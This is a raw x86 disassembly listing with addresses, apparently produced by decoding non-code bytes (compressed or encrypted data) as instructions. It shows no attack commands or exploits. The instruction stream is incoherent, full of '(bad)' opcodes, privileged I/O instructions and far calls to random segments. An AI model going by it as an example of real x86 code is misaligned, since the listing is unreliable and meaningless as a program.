  42b946:	pop    edx
  42b947:	or     eax,DWORD PTR [ebx+0xda7c302]
  42b94d:	jbe    0x42b9c7
  42b94f:	dec    ebp
  42b950:	or     ebp,DWORD PTR [esi+0x7bb1957b]
  42b956:	call   0xbaa26ee3
  42b95b:	inc    edi
  42b95c:	icebp  
  42b95d:	pop    ds
  42b95e:	outs   dx,DWORD PTR ds:[esi]
  42b95f:	push   ebp
  42b960:	les    edx,FWORD PTR [edi+0x39]
  42b963:	jns    0x42b91b
  42b965:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b966:	aas    
  42b967:	je     0x42b9d9
  42b969:	into   
  42b96a:	push   cs
  42b96b:	or     eax,0xeb567732
  42b970:	push   ebx
  42b971:	adc    eax,0x572dee5
  42b976:	loop   0x42b9de
  42b978:	mov    dl,0x68
  42b97a:	sub    al,0x3d
  42b97c:	dec    esi
  42b97d:	(bad)  
  42b97e:	outs   dx,BYTE PTR ds:[esi]
  42b97f:	dec    edi
  42b980:	mov    ebx,0x85d80742
  42b985:	mov    edi,esp
  42b987:	sti    
  42b988:	test   DWORD PTR ds:0x61c4a70b,0x1002cc65
  42b992:	es mov edi,0x5e18c8b2
  42b998:	rcr    DWORD PTR [esp+edi*1-0x4f],cl
  42b99c:	mov    ds:0xfb62380a,al
  42b9a1:	mov    cl,0xe2
  42b9a3:	test   eax,0xdeffcb2a
  42b9a8:	jmp    0x43c6:0xe1ace6bb
  42b9af:	sub    al,0x27
  42b9b1:	pop    esp
  42b9b2:	call   0xb02d:0x91f9b45f
  42b9b9:	retf   0xcd81
  42b9bc:	sub    DWORD PTR [ebx+0x58a5e7a6],edx
  42b9c2:	call   0x3ce54381
  42b9c7:	data16 ja 0x42b970
  42b9ca:	stos   BYTE PTR es:[edi],al
  42b9cb:	jmp    0x9a5485cf
  42b9d0:	mov    dl,0xc5
  42b9d2:	add    cl,bl
  42b9d4:	aad    0x6a
  42b9d6:	nop
  42b9d7:	pop    ebx
  42b9d8:	cmp    BYTE PTR [ebx],cl
  42b9da:	retf   
  42b9db:	jb     0x42b98c
  42b9dd:	xchg   DWORD PTR [ecx+esi*2-0x4a],edi
  42b9e1:	mov    ah,0x8d
  42b9e3:	cmp    DWORD PTR [ebx+eiz*4-0x66],eax
  42b9e7:	add    eax,0x44a193a9
  42b9ec:	outs   dx,BYTE PTR ds:[esi]
  42b9ed:	or     ah,BYTE PTR [eax+0x54]
  42b9f0:	stos   BYTE PTR es:[edi],al
  42b9f1:	push   0xdf10acef
  42b9f6:	out    0x99,eax
  42b9f8:	mov    ebp,0xf6aec39a
  42b9fd:	fild   WORD PTR [ebp+eiz*4+0x54]
  42ba01:	rcr    BYTE PTR [ebx+0x38e80d74],0x4f
  42ba08:	fcmovbe st,st(4)
  42ba0a:	pop    ecx
  42ba0b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42ba0c:	repz mov ecx,DWORD PTR [edx+edx*8-0x101932d5]
  42ba14:	mov    dl,0xc1
  42ba16:	sub    ah,bh
  42ba18:	popf   
  42ba19:	jne    0x42b9d1
  42ba1b:	xlat   BYTE PTR ds:[ebx]
  42ba1c:	xor    eax,0xa3ba460b
  42ba21:	sbb    eax,0x2f2068b4
  42ba26:	xchg   BYTE PTR [ebx-0x126558fd],bl
  42ba2c:	loope  0x42ba1c
  42ba2e:	and    edi,DWORD PTR [ecx+ebx*4+0xb]
  42ba32:	xchg   ebx,eax
  42ba33:	sqrtps xmm3,XMMWORD PTR [esi]
  42ba36:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42ba37:	aaa    
  42ba38:	cmp    DWORD PTR [eax*4+0x5a7ee5de],ecx
  42ba3f:	out    dx,al
  42ba40:	xor    ecx,DWORD PTR [esi+0xb3d3e28]
  42ba46:	outs   dx,DWORD PTR ds:[esi]
  42ba47:	call   0xcc8a:0x4b37772c
  42ba4e:	call   0x826:0xba757a6c
  42ba55:	scas   al,BYTE PTR es:[edi]
  42ba56:	in     eax,0xa7
  42ba58:	sahf   
  42ba59:	pop    ss
  42ba5a:	test   esp,ebx
  42ba5c:	mov    ebp,edi
  42ba5e:	int    0xdf
  42ba60:	mov    dl,0x98
  42ba62:	mov    ah,0x61
  42ba64:	mov    al,ds:0x4e0d103a
  42ba69:	or     al,0x58
  42ba6b:	(bad)  
  42ba6c:	imul   ebx,DWORD PTR [ebx],0x55d5572b
  42ba72:	sub    eax,0x8c22ae62
  42ba77:	mov    ebx,0xeda273b2
  42ba7c:	add    dl,dh
  42ba7e:	inc    ebp
  42ba7f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42ba80:	mov    BYTE PTR ss:[eax+0x30],dl
  42ba84:	call   0xac9bf7cf
  42ba89:	cli    
  42ba8a:	or     al,0xb2
  42ba8c:	repnz fs cs pushf 
  42ba90:	sub    al,0xed
  42ba92:	sub    al,0xb8
  42ba94:	add    DWORD PTR ds:0x44af261f,0xdf5abb41
  42ba9e:	pop    ss
  42ba9f:	ja     0x42ba53
  42baa1:	adc    al,0x48
  42baa3:	push   eax
  42baa4:	(bad)  
  42baa5:	fmul   st,st(1)
  42baa7:	pop    esp
  42baa8:	gs mov ebx,0xa5d3a740
  42baae:	fwait
  42baaf:	and    eax,0x720fee6a
  42bab4:	mov    cl,0x2c
  42bab6:	lods   al,BYTE PTR ds:[esi]
  42bab7:	xlat   BYTE PTR ds:[ebx]
  42bab8:	xor    ecx,esp
  42baba:	adc    eax,0x80824507
  42babf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42bac0:	dec    ebx
  42bac1:	out    dx,eax
  42bac2:	and    edi,DWORD PTR [esi]
  42bac4:	scas   eax,DWORD PTR es:[edi]
  42bac5:	push   ds
  42bac6:	xor    BYTE PTR [ebp-0x4f],ah
  42bac9:	call   0x2fc8:0xe173e364
  42bad0:	jmp    0x2100:0x55a7dbc7
  42bad7:	out    dx,al
  42bad8:	mov    DWORD PTR [edx+0x6cb319ba],ebp
  42bade:	mov    DWORD PTR [edi],0x9ffc7dc3
  42bae4:	rcl    BYTE PTR [ecx-0x6b],cl
  42bae7:	lahf   
  42bae8:	mov    eax,0x3a439b9b
  42baed:	mov    dh,0x7b
  42baef:	mov    ecx,edi
  42baf1:	out    dx,eax
  42baf2:	xchg   DWORD PTR [ebx-0x4e],esi
  42baf5:	dec    ebp
  42baf6:	popa   
  42baf7:	inc    edi
  42baf8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42baf9:	pushf  
  42bafa:	outs   dx,BYTE PTR ds:[esi]
  42bafb:	xor    ebp,DWORD PTR [ecx]
  42bafd:	icebp  
  42bafe:	test   al,0xa7
  42bb00:	ss cmc 
  42bb02:	cdq    
  42bb03:	and    ch,BYTE PTR [edi-0x42365f98]
  42bb09:	int3   
  42bb0a:	aas    
  42bb0b:	rcl    DWORD PTR [ebx+0x74d799f6],cl
  42bb11:	fucom  st(1)
  42bb13:	push   ss
  42bb14:	pop    edx
  42bb15:	dec    eax
  42bb16:	jle    0x42bb0e
  42bb18:	enter  0xaa30,0x55
  42bb1c:	mov    bl,0xda
  42bb1e:	lahf   
  42bb1f:	cs mov edi,0x916b3583
  42bb25:	rcr    BYTE PTR [edx-0x49f76b3d],cl
  42bb2b:	out    0xac,al
  42bb2d:	fmul   QWORD PTR [ecx+0xd729bd5]
  42bb33:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42bb34:	jno    0x42bb3d
  42bb36:	or     al,0x9e
  42bb38:	fstp   DWORD PTR [edx]
  42bb3a:	rol    al,0x48
  42bb3d:	jno    0x42bad9
  42bb3f:	add    BYTE PTR [ecx+0x2dd35d24],0xfb
  42bb46:	jle    0x42bae8
  42bb48:	mov    ebx,0x964fe729
  42bb4d:	retf   
  42bb4e:	inc    esp
  42bb4f:	pop    edi
  42bb50:	inc    esi
  42bb51:	loop   0x42baf6
  42bb53:	jmp    0x24a64700
  42bb58:	les    ecx,FWORD PTR [edx]
  42bb5a:	sub    al,0xfe
  42bb5c:	(bad)  
  42bb5d:	or     edi,DWORD PTR [ebx]
  42bb5f:	scas   eax,DWORD PTR es:[edi]
  42bb60:	in     eax,0xd6
  42bb62:	and    ch,BYTE PTR [edi+0x58]
  42bb65:	xchg   edi,eax
  42bb66:	call   0xd947:0xab339505
  42bb6d:	jmp    0x8e86436
  42bb72:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42bb73:	sub    edx,DWORD PTR [edx]
  42bb75:	(bad)  
  42bb76:	cld    
  42bb77:	ret    0xf633
  42bb7a:	out    dx,eax
  42bb7b:	aaa    
  42bb7c:	mov    al,0xd9
  42bb7e:	adc    bl,bl
  42bb80:	aas    
  42bb81:	add    al,0x7e
  42bb83:	addr16 mov ds:0x6b5c,al
  42bb87:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42bb88:	add    eax,0x29888f2a
  42bb8d:	sbb    eax,0x43b55e42
  42bb92:	shr    DWORD PTR [ebx],1
  42bb94:	push   ebx
  42bb95:	adc    al,0xa
  42bb97:	jb     0x42bb83
  42bb99:	mov    ?,WORD PTR [edx]
  42bb9b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42bb9c:	and    bl,BYTE PTR [edi-0x1799b291]
  42bba2:	dec    edx
  42bba3:	shl    DWORD PTR [edx+0x5067b1b],1
  42bba9:	inc    edx
  42bbaa:	ret    0xd5a5
  42bbad:	or     eax,eax
  42bbaf:	fisubr DWORD PTR [esi]
  42bbb1:	xor    DWORD PTR [eax-0x5c],esi
  42bbb4:	cmp    eax,0x6f4bb7f1
  42bbb9:	or     ecx,edi
  42bbbb:	sbb    BYTE PTR [edx],bh
  42bbbd:	or     eax,0xc212a657
  42bbc2:	(bad)  [ebp+0x7338a760]
  42bbc8:	mov    ch,0xc3
  42bbca:	call   0x28ba:0xb514a5dd
  42bbd1:	loop   0x42bbaa
  42bbd3:	lods   eax,DWORD PTR ds:[esi]
  42bbd4:	push   ss
  42bbd5:	dec    ebx
  42bbd6:	cld    
  42bbd7:	pop    ds
  42bbd8:	sub    eax,0xc8f8360b
  42bbdd:	icebp  
  42bbde:	or     ah,BYTE PTR [edx+esi*4-0x69]
  42bbe2:	aam    0x4e
  42bbe4:	jo     0x42bb76
  42bbe6:	adc    ah,BYTE PTR [ebp-0xdcdf410]
  42bbec:	cli    
  42bbed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42bbee:	sti    
  42bbef:	adc    BYTE PTR [eax-0x53],ch
  42bbf2:	call   0xb50d:0xaad732ca
  42bbf9:	jne    0x42bc6c
  42bbfb:	aam    0x16
  42bbfd:	or     esi,DWORD PTR [edi-0x76]
  42bc00:	mov    cl,0x40
  42bc02:	adc    ebp,DWORD PTR [ebx-0xd6553b0]
  42bc08:	or     DWORD PTR [ecx-0x10],eax
  42bc0b:	in     al,0x87
  42bc0d:	mov    ah,0x92
  42bc0f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42bc10:	ds push edx
  42bc12:	cli    
  42bc13:	jae    0x42bc3d
  42bc15:	mov    ah,BYTE PTR [edi-0x74304dc9]
  42bc1b:	(bad)  
  42bc1d:	adc    DWORD PTR [edx-0x61],edx
  42bc20:	dec    DWORD PTR [ebx]
  42bc22:	das    
  42bc23:	mov    eax,0x272c1f4b
  42bc28:	loope  0x42bc41
  42bc2a:	call   0x80a2:0x23e73885
  42bc31:	and    al,0x2a
  42bc33:	lods   al,BYTE PTR ds:[esi]
  42bc34:	mov    al,ds:0x32cde311
  42bc39:	mov    eax,0xc683e0ba
  42bc3e:	call   0xf306:0x595dbc0d
  42bc45:	mov    ds:0x9d77a80a,al
  42bc4a:	aad    0x4c
  42bc4c:	xchg   edx,eax
  42bc4d:	or     al,0x2b
  42bc4f:	adc    ah,BYTE PTR [ebx+0x31c7a49c]
  42bc55:	or     al,0xd8
  42bc57:	xor    al,0x55
  42bc59:	pop    esp
  42bc5a:	mov    edx,0xd94b8b0f
  42bc5f:	pushf  
  42bc60:	push   ebx
  42bc61:	sti    
  42bc62:	call   0xec52:0x75593c3d
  42bc69:	dec    edi
  42bc6a:	call   0xfade:0xb58849d
  42bc71:	mov    bh,BYTE PTR [edx]
  42bc73:	lahf   
  42bc74:	xor    eax,0xb1891a7b
  42bc79:	inc    esi
  42bc7a:	xchg   esi,ecx
  42bc7c:	xor    al,0x26
  42bc7e:	call   0xd1ff:0xba66476
  42bc85:	pop    edx
  42bc86:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42bc87:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42bc88:	sub    dl,cl
  42bc8a:	or     DWORD PTR ds:0x555e3198,0xffffffb2
  42bc91:	push   es
  42bc92:	call   0x7c9df1a8
  42bc97:	dec    esi
  42bc98:	xor    BYTE PTR [eax],cl
  42bc9a:	jecxz  0x42bcc2
  42bc9c:	push   edx
  42bc9d:	ffreep st(0)
  42bc9f:	leave  
  42bca0:	xor    bh,dh
  42bca2:	(bad)  
  42bca3:	arpl   WORD PTR [edx+0x4df68631],si
  42bca9:	cli    
  42bcaa:	sub    DWORD PTR ds:0x7d080c25,ebp
  42bcb0:	pop    ebp
  42bcb1:	shl    DWORD PTR ds:0x61a5eef7,cl
  42bcb7:	jne    0x42bc6e
  42bcb9:	repz add eax,0x8a93b726
  42bcbf:	sbb    al,0x13
  42bcc1:	js     0x42bc67
  42bcc3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42bcc4:	leave  
  42bcc5:	(bad)  
  42bcc6:	cmp    BYTE PTR [eax+0xe],bl
  42bcc9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42bcca:	js     0x42bd2d
  42bccc:	mov    dl,0xe6
  42bcce:	repz jmp 0x8ac:0x5e11ff99
  42bcd6:	scas   eax,DWORD PTR es:[edi]
  42bcd7:	leave  
  42bcd8:	cld    
  42bcd9:	xchg   edi,eax
  42bcda:	loop   0x42bc84
  42bcdc:	dec    edx
  42bcdd:	xchg   esi,eax
  42bcde:	sbb    al,ch
  42bce0:	sub    bl,BYTE PTR [edi+0x34301c9a]
  42bce6:	jp     0x42bca8
  42bce8:	or     esi,DWORD PTR [ecx+ecx*1-0x5]
  42bcec:	cmp    DWORD PTR [ecx+0xc19e99b],edx
  42bcf2:	pop    esp
  42bcf3:	xchg   edi,eax
  42bcf4:	retfw  
  42bcf6:	jb     0x42bd12
  42bcf8:	mov    dl,0x3f
  42bcfa:	dec    eax
  42bcfb:	aas    
  42bcfc:	and    edx,DWORD PTR [edi]
  42bcfe:	mov    BYTE PTR [esi-0x33],ch
  42bd01:	or     ebx,ecx
  42bd03:	mov    esp,0xe6dfd11b
  42bd08:	and    BYTE PTR [ebp-0x5e],ah
  42bd0b:	test   eax,0x1d3b8b6c
  42bd10:	fcmovnbe st,st(0)
  42bd12:	add    edx,DWORD PTR [ecx]
  42bd14:	add    eax,0x45dd4b0a
  42bd19:	jo     0x42bce9
  42bd1b:	and    DWORD PTR [edi],0xb2f7deeb
  42bd21:	or     DWORD PTR [esi],0x6a
  42bd24:	push   es
  42bd25:	imul   eax,DWORD PTR [edx+0x14],0x11f30b00
  42bd2c:	addr16 and bh,ch
  42bd2f:	jnp    0x42bcdf
  42bd31:	inc    esp
  42bd32:	xchg   esi,edx
  42bd34:	call   0xf325d760
  42bd39:	dec    ecx
  42bd3a:	fisttp DWORD PTR [ebx-0x5d]
  42bd3d:	or     bl,BYTE PTR [esi-0x7c9d71c8]
  42bd43:	dec    ecx
  42bd44:	es in  al,dx
  42bd46:	sub    dl,bl
  42bd48:	cmp    eax,0x6b8b9aa7
  42bd4d:	fisub  WORD PTR [esi+eax*4-0x5885f524]
  42bd54:	sub    dh,BYTE PTR [edi-0x6758c418]
  42bd5a:	push   ds
  42bd5b:	lahf   
  42bd5c:	mov    dl,0xed
  42bd5e:	scas   eax,DWORD PTR es:[edi]
  42bd5f:	push   ecx
  42bd60:	imul   eax,DWORD PTR [edi+ebx*2+0x530b3c97],0x76
  42bd68:	adc    eax,0x8d9d8ff0
  42bd6d:	ficomp WORD PTR [edx-0x2ecfb87e]
  42bd73:	cmp    al,BYTE PTR [ebp+0x7e]
  42bd76:	sub    al,0xa0
  42bd78:	pop    edi
  42bd79:	sbb    al,BYTE PTR [ebp-0x38f4e05c]
  42bd7f:	rol    bl,0x4c
  42bd82:	call   0x9e5e:0xb644c7f
  42bd89:	fsubr  QWORD PTR [edi-0x58]
  42bd8c:	fs mov al,ss:0x7538d1e9
  42bd93:	inc    edi
  42bd94:	bound  esi,QWORD PTR [ecx-0x303a883c]
  42bd9a:	xchg   esp,eax
  42bd9b:	pop    es
  42bd9c:	jns    0x42bdf1
  42bd9e:	shl    DWORD PTR [esp+ebx*8],0xd0
  42bda2:	retf   
  42bda3:	jg     0x42be18
  42bda5:	imul   ebx,DWORD PTR [eax-0x59],0xffffffe0
  42bda9:	jecxz  0x42bd37
  42bdab:	sbb    eax,0xeaf899f2
  42bdb0:	mov    dl,0x10
  42bdb2:	in     eax,dx
  42bdb3:	jns    0x42be0e
  42bdb5:	jae    0x42bd73
  42bdb7:	je     0x42bdba
  42bdb9:	or     eax,0x2368589d
  42bdbe:	stos   DWORD PTR es:[edi],eax
  42bdbf:	pop    edi
  42bdc0:	mov    dl,0xab
  42bdc2:	mov    dh,0xfa
  42bdc4:	mov    eax,0xe5b7b460
  42bdc9:	jb     0x42be42
  42bdcb:	pop    ss
  42bdcc:	jno    0x42bdd9
  42bdce:	mov    eax,ds:0xb2098b74
  42bdd3:	aam    0x6e
  42bdd5:	rcr    BYTE PTR [edx-0x7c248cd0],1
  42bddb:	or     al,0x7
  42bddd:	jle    0x42bd63
  42bddf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42bde0:	xchg   edi,eax
  42bde1:	inc    edi
  42bde2:	daa    
  42bde3:	pop    eax
  42bde4:	outs   dx,DWORD PTR ds:[esi]
  42bde5:	dec    ebx
  42bde6:	jne    0x42bda9
  42bde8:	mov    esp,0x61ec465b
  42bded:	or     ebx,DWORD PTR [ebp-0x4]
  42bdf0:	push   ecx
  42bdf1:	xor    BYTE PTR [ecx],bh
  42bdf3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42bdf4:	mov    dh,0xb7
  42bdf6:	sti    
  42bdf7:	dec    ebx
  42bdf8:	xlat   BYTE PTR ds:[ebx]
  42bdf9:	and    ah,BYTE PTR [eax-0x47]
  42bdfc:	lds    ebx,FWORD PTR [eax-0x5a]
  42bdff:	aas    
  42be00:	mov    edx,0xb2dec031
  42be05:	ret    
  42be06:	xchg   ecx,eax
  42be07:	dec    ecx
  42be08:	arpl   WORD PTR [ecx],sp
  42be0a:	or     al,BYTE PTR [ebp-0x58df477]
  42be10:	jmp    0x749e:0x3e89d90e
  42be17:	dec    esp
  42be18:	and    al,BYTE PTR [esi-0x52819b5b]
  42be1e:	test   al,0x7b
  42be20:	mov    dl,0x2d
  42be22:	das    
  42be23:	stos   DWORD PTR es:[edi],eax
  42be24:	mov    ebp,esi
  42be26:	call   0xc245f06f
  42be2b:	test   eax,0x562e5086
  42be30:	mov    dl,0x51
  42be32:	cmp    eax,0x3acfe3b0
  42be37:	nop
  42be38:	sub    BYTE PTR [ebx],cl
  42be3a:	rol    BYTE PTR [ecx-0x26],1
  42be3d:	test   al,0x32
  42be3f:	or     dh,dh
  42be41:	fistp  DWORD PTR [edx+0x33732d23]
  42be47:	std    
  42be48:	pop    ebp
  42be49:	cmp    eax,0x93aaa7e4
  42be4e:	cmp    cl,dl
  42be50:	sbb    dl,BYTE PTR es:[ecx]
  42be53:	ja     0x42be07
  42be55:	mov    dl,0xcd
  42be57:	sbb    ch,ah
  42be59:	inc    edi
  42be5a:	xchg   ecx,eax
  42be5b:	loop   0x42bea7
  42be5d:	add    eax,0x24e201a8
  42be62:	cmp    ah,BYTE PTR [eax-0x4b]
  42be65:	in     al,dx
  42be66:	shl    DWORD PTR [edi+edx*4-0x2e84afb0],1
  42be6d:	or     ecx,DWORD PTR [edx+0x68]
  42be70:	lahf   
  42be71:	shr    DWORD PTR [ebx],cl
  42be73:	mov    ?,WORD PTR [edx-0x1d345e54]
  42be79:	imul   ebx,DWORD PTR [edx-0xf],0x41ce13fb
  42be80:	jp     0x42be9f
  42be82:	sbb    BYTE PTR [edx-0x4e],cl
  42be85:	cmp    BYTE PTR [edi+0x4ef81ecf],dh
  42be8b:	dec    esp
  42be8c:	jnp    0x42be99
  42be8e:	push   ecx
  42be8f:	sbb    dl,bl
  42be91:	jb     0x42bed0
  42be93:	sbb    cx,sp
  42be96:	call   0xc82c:0xcf17e3fb
  42be9d:	jns    0x42be6d
  42be9f:	test   eax,0x8fa72267
  42bea4:	jb     0x42bef0
  42bea6:	loope  0x42be75
  42bea8:	cmp    esp,DWORD PTR [eax]
  42beaa:	call   0xd02f:0x5b0f8ba
  42beb1:	retf   0xa795
  42beb4:	mov    edx,0x8aad8fbc
  42beb9:	popa   
  42beba:	bnd jp 0x42be69
  42bebd:	call   0xd05f:0x54328723
  42bec4:	(bad)  
  42bec5:	xchg   esp,eax
  42bec6:	cdq    
  42bec7:	sbb    BYTE PTR [edx-0x27],cl
  42beca:	call   0xf231:0x3647012d
  42bed1:	leave  
  42bed2:	imul   esp,DWORD PTR [eax-0x532ab07b],0xffffffce
  42bed9:	retf   0xa120
  42bedc:	int3   
  42bedd:	fist   WORD PTR [eax-0x22944d41]
  42bee3:	jno    0x42be71
  42bee5:	imul   edx,DWORD PTR [esi+0xc],0xfcdf0b17
  42beec:	(bad)  
  42beed:	fild   WORD PTR [ebx-0x6544d8a0]
  42bef3:	mov    dh,0xd6
  42bef5:	mov    ?,WORD PTR [edi+0x580ad9d4]
  42befb:	pop    edi
  42befc:	enter  0x9508,0x2f
  42bf00:	mov    dh,BYTE PTR [ecx]
  42bf02:	sub    BYTE PTR [edi+0x2a],al
  42bf05:	pop    ebx
  42bf06:	pop    edi
  42bf07:	icebp  
  42bf08:	les    edx,FWORD PTR [edi]
  42bf0a:	call   0xc218:0x173ffb30
  42bf11:	adc    DWORD PTR [eax-0x59],ecx
  42bf14:	push   edi
  42bf15:	icebp  
  42bf16:	mov    ch,0x74
  42bf18:	jnp    0x42bf85
  42bf1a:	test   al,0xb9
  42bf1c:	out    dx,al
  42bf1d:	(bad)  
  42bf1e:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  42bf20:	mov    ecx,0x7a5fe0c4
  42bf25:	(bad)
  42bf2b:	cmp    al,BYTE PTR [esi+0x2e6663fe]
  42bf31:	jmp    0xb83dafd0
  42bf36:	sbb    eax,0xb7fbcdbb
  42bf3b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42bf3c:	call   0x7676dee
  42bf41:	cmp    dl,0x63
  42bf44:	leave  
  42bf45:	imul   ebx,DWORD PTR [edx-0x41e0f6fb],0x9f16283b
  42bf4f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42bf50:	ss inc esi
  42bf52:	cmp    edi,DWORD PTR [ebp-0x65]
  42bf55:	out    dx,eax
  42bf56:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42bf58:	mov    dl,0x77
  42bf5a:	loope  0x42bf34
  42bf5c:	adc    BYTE PTR [ecx+0x0],ch
  42bf5f:	(bad)  
  42bf60:	fabs   
  42bf62:	in     al,0xa7
  42bf64:	pusha  
  42bf65:	iret   
  42bf66:	repnz nop
  42bf68:	or     BYTE PTR [edi],bl
  42bf6a:	push   es
  42bf6b:	(bad)
  42bf6f:	test   eax,0xc26e0f7c
  42bf74:	jg     0x42bfed
  42bf76:	pop    ebx
  42bf77:	scas   al,BYTE PTR es:[edi]
  42bf78:	dec    ebx
  42bf79:	imul   ecx,DWORD PTR [esi+esi*8+0x31d4d0b2],0x2f
  42bf81:	(bad)  
  42bf82:	xchg   esp,eax
  42bf83:	inc    ebp
  42bf84:	mov    al,ds:0x9407e007
  42bf89:	mov    ebp,0xb9cdfcf
  42bf8e:	dec    ebx
  42bf8f:	xlat   BYTE PTR ds:[ebx]
  42bf90:	jl     0x42bf12
  42bf92:	mov    cs,WORD PTR [ebx-0x6d]
  42bf95:	fstp   QWORD PTR [edx+0x69d7449f]
  42bf9b:	enter  0x35e0,0xe0
  42bf9f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42bfa0:	mov    esi,DWORD PTR [edi+0x9206d5f]
  42bfa6:	icebp  
  42bfa7:	pushf  
  42bfa8:	add    ah,dh
  42bfaa:	out    dx,eax
  42bfab:	mov    ds:0x7411d1d7,al
  42bfb0:	lds    ecx,FWORD PTR [ebx]
  42bfb2:	jge    0x42bfea
  42bfb4:	aaa    
  42bfb5:	pop    es
  42bfb6:	push   ss
  42bfb7:	sub    DWORD PTR [edx-0x3f2c2ba1],esi
  42bfbd:	xor    BYTE PTR [esi-0x2e],dl
  42bfc0:	stos   DWORD PTR es:[edi],eax
  42bfc1:	ja     0x42c000
  42bfc3:	aaa    
  42bfc4:	aas    
  42bfc5:	fwait
  42bfc6:	loop   0x42bf6d
  42bfc8:	pop    ecx
  42bfc9:	scas   al,BYTE PTR es:[edi]
  42bfca:	pusha  
  42bfcb:	std    
  42bfcc:	or     BYTE PTR [ebx],ah
  42bfce:	cli    
  42bfcf:	addr16 xchg esi,eax
  42bfd1:	ins    DWORD PTR es:[edi],dx
  42bfd2:	call   0x73e0:0xc8affc73
  42bfd9:	neg    BYTE PTR [ecx+0x19e6fd9c]
  42bfdf:	cmp    eax,0x7aa337f9
  42bfe4:	cmp    dh,BYTE PTR [esi+0x2c]
  42bfe7:	es inc ecx
  42bfe9:	out    0x6a,eax
  42bfeb:	add    dh,BYTE PTR [edx-0x2ea0f9d5]
  42bff1:	jae    0x42bf8e
  42bff3:	dec    ebx
  42bff4:	or     BYTE PTR [edx*2+0x4ce0aa62],cl
  42bffb:	aaa    
  42bffc:	or     eax,0xb2c2e378
  42c001:	xor    bl,BYTE PTR [ebx]
  42c003:	ds mov bl,0x77
  42c006:	or     BYTE PTR [edx-0x1489f54f],al
  42c00c:	add    edx,eax
  42c00e:	dec    esp
  42c00f:	mov    ebx,DWORD PTR ds:0xb7af724b
  42c015:	mov    ebp,0xbafd0a6
  42c01a:	push   edx
  42c01b:	and    ebp,ecx
  42c01d:	xchg   BYTE PTR [ebp+0x40],bl
  42c020:	lods   al,BYTE PTR ds:[esi]
  42c021:	add    al,0x3e
  42c023:	cld    
  42c024:	cli    
  42c025:	mov    ah,0x7d
  42c027:	stos   BYTE PTR es:[edi],al
  42c028:	in     al,0x2b
  42c02a:	add    bl,BYTE PTR [ebx-0x486bc669]
  42c030:	loop   0x42bff2
  42c032:	popf   
  42c033:	daa    
  42c034:	mov    ah,BYTE PTR [ebx]
  42c036:	into   
  42c037:	sbb    eax,0x84ef0b32
  42c03c:	lock pop ss
  42c03e:	bound  ebx,QWORD PTR [eax]
  42c040:	into   
  42c041:	les    ebx,FWORD PTR [edx+0x6669769c]
  42c047:	push   es
  42c048:	push   esi
  42c049:	je     0x42c08c
  42c04b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42c04c:	out    0x1,al
  42c04e:	or     BYTE PTR [ebx-0x6],dl
  42c051:	xor    bh,bh
  42c053:	add    BYTE PTR [edx+0x2fd70f94],dh
  42c059:	push   ecx
  42c05a:	test   al,0x42
  42c05c:	imul   ecx,DWORD PTR [ebx],0x46425c66
  42c062:	lds    edx,FWORD PTR [edx+0x5e944e26]
  42c068:	sbb    DWORD PTR ds:0x77c187b4,ebp
  42c06e:	and    DWORD PTR [eax],ebp
  42c070:	or     BYTE PTR [ebx],0xe5
  42c073:	mov    dl,0xf0
  42c075:	fld    DWORD PTR [ebp-0x651127ce]
  42c07b:	test   BYTE PTR [ebx-0x1396fc6f],bl
  42c081:	outs   dx,DWORD PTR ds:[esi]
  42c082:	jne    0x42c02d
  42c084:	or     al,0x2d
  42c086:	mov    BYTE PTR [ecx+0x52],dl
  42c089:	sbb    ebx,DWORD PTR [edi+0x5b]
  42c08c:	pop    edx
  42c08d:	dec    edx
  42c08e:	xchg   ebp,eax
  42c08f:	(bad)  
  42c090:	jmp    0x42c058
  42c092:	aaa    
  42c093:	xchg   edx,ecx
  42c095:	cli    
  42c096:	cdq    
  42c097:	sbb    edx,DWORD PTR [ecx+0x4d67a20b]
  42c09d:	data16 ins BYTE PTR es:[edi],dx
  42c09f:	mov    eax,ds:0x19d166f
  42c0a4:	and    dh,BYTE PTR [ebp-0x74d3d052]
  42c0aa:	sub    DWORD PTR [eax],esp
  42c0ac:	add    dh,0x2a
  42c0af:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42c0b0:	dec    bl
  42c0b2:	repz jecxz 0x42c0df
  42c0b5:	pop    edx
  42c0b6:	in     eax,0xc7
  42c0b8:	xor    DWORD PTR [edx-0x18],ecx
  42c0bb:	sbb    esi,DWORD PTR [ebx-0x452abe88]
  42c0c1:	fsqrt  
  42c0c3:	lea    esi,[esi-0x2c]
  42c0c6:	or     DWORD PTR [edi-0x7f72d5a8],esp
  42c0cc:	ret    
  42c0cd:	mov    BYTE PTR [esi+0x44],bl
  42c0d0:	(bad)  
  42c0d1:	cs pop edi
  42c0d3:	packsswb mm1,QWORD PTR [esi-0x4827a279]
  42c0da:	fisttp WORD PTR [edx+ebx*4+0x6d77987d]
  42c0e1:	cmp    DWORD PTR [edx-0x3c832739],0xffffffa7
  42c0e8:	repnz mov eax,ds:0xa8c3405e
  42c0ee:	xchg   DWORD PTR [eax],edi
  42c0f0:	mov    bl,0x63
